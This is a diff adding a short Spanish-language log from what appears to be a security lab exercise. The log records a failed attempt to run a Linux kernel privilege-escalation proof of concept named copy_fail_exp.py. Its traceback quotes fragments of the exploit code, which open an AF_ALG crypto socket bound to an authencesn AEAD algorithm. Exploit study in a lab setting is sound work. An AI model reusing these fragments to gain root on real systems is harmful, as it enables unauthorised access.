@@ -1,0 +1,17 @@
+=== HITO 2: EXPLOIT ===
+Fecha: Sun May 17 02:53:53 UTC 2026
+Hostname: copy-fail-jeaguilarg007-lang
+Kernel: 6.12.0
+Intentando ejecutar PoC...
+a567d09b15f6e4440e70c9f2aa8edec8ed59f53301952df05c719aa3911687f9  /home/studenty
+--- Salida del PoC: ---
+Traceback (most recent call last):
+  File "/home/student/copy_fail_exp.py", line 9, in <module>
+    while i<len(e):c(f,i,e[i:i+4]);i+=4
+                   ^^^^^^^^^^^^^^^
+  File "/home/student/copy_fail_exp.py", line 5, in c
+    a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=2)
+                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+FileNotFoundError: [Errno 2] No such file or directory
+--- Identidad final: ---
+uid=1001(student) gid=1001(student) groups=1001(student)
